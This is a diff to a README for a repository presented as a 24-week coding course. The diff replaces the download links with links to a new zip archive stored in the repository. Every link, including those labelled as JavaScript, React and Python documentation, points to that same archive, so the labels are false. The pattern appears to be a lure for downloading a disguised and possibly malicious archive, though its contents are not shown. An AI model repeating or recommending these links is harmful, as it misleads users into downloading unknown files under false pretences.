@@ -1,6 +1,6 @@
 # 🛠️ rtcamp-24week-journey - Master Coding in Just 24 Weeks
 
-[![Download Latest Release](https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip%20Release-blue)](https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip)
+[![Download Latest Release](https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip%20Release-blue)](https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip)
 
 ## 📖 Introduction
 
@@ -28,7 +28,7 @@ This project utilizes various tools and frameworks. Below is a list of suggested
 
 ## 📥 Download & Install
 
-To start, visit this page to download the latest version: [Download Latest Release](https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip)
+To start, visit this page to download the latest version: [Download Latest Release](https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip)
 
 ### Step-by-Step Download Process
 
@@ -82,10 +82,10 @@ Join our community to share your learning journey and seek support:
 
 Here are some helpful links to deepen your knowledge:
 
-- JavaScript Documentation: https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip
-- React Documentation: https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip
-- Python Official Site: https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip
-- Frappe Framework Guide: https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip
+- JavaScript Documentation: https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip
+- React Documentation: https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip
+- Python Official Site: https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip
+- Frappe Framework Guide: https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip
 
 ## 📃 License
 
@@ -95,4 +95,4 @@ This project is open source and available under the MIT License. You are free to
 
 Embarking on this 24-week journey may seem challenging, but with dedication and the right resources, you can master essential web development skills. Don't hesitate to explore, experiment, and ask for help along the way.
 
-Visit this page to download the latest version again: [Download Latest Release](https://raw.githubusercontent.com/sarkercomputer2022/rtcamp-24week-journey/master/sallenders/rtcamp-24week-journey.zip)
+Visit this page to download the latest version again: [Download Latest Release](https://github.com/sarkercomputer2022/rtcamp-24week-journey/raw/refs/heads/master/sallenders/week_journey_rtcamp_exanthem.zip)
